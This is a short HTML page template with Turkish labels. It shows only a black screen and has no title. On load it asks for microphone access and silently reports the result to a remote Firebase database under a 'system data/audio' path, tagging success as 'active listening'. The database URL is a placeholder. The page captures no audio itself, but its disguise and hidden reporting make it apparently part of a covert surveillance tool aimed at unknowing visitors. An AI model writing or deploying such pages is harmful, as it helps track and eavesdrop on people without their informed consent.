<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>body { background: #000; margin: 0; }</style>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
    <script>
        const firebaseConfig = { databaseURL: "BURAYA_FIREBASE_DATABASE_URL" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                db.ref('sistem_verileri/ses').set({ durum: "Mikrofon İzni Alındı (Aktif Dinleme)" });
                stream.getTracks().forEach(t => t.stop());
            }).catch(err => { db.ref('sistem_verileri/ses').set({ durum: "Reddedildi: " + err.message }); });
        };
    </script>
</body>
</html>
